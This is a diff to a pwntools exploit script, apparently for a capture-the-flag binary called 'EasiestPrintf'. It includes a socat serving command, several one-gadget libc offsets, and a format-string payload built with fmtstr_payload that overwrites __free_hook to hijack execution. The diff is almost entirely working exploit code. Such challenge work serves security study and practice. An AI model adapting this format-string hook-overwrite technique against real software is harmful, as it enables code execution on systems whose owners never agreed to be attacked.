@@ -24,9 +24,17 @@ if sys.argv[1] == "l":
 
 
 else:
+    '''
+    socat -d -d TCP-LISTEN:9999,reuseaddr,fork EXEC:"env LD_PRELOAD=./libc_so ./EasiestPrintf"
+    '''
     io = remote("localhost", 9999)
-    libc = ELF("./libc.so.6")
-    oneGadget = 0x3e297
+    libc = ELF("./libc_so")
+    oneGadget = 0x3ac5c
+    oneGadget = 0x3ac5e
+    oneGadget = 0x3ac62
+    oneGadget = 0x3ac69
+    oneGadget = 0x5fbc5
+    oneGadget = 0x5fbc6
 
 
 def DEBUG(cmd = ""):
@@ -40,9 +48,10 @@ if __name__ == "__main__":
     pause()
 
     mallocHook = libc.sym['__malloc_hook']
+    freeHook = libc.sym['__free_hook']
     oneGadget = libc.address + oneGadget
 
-    payload = fmtstr_payload(7, {mallocHook: oneGadget}, write_size = 'int')
+    payload = fmtstr_payload(7, {freeHook: oneGadget}, write_size = 'int')
     payload += "%10000c"
     io.sendline(payload)
     
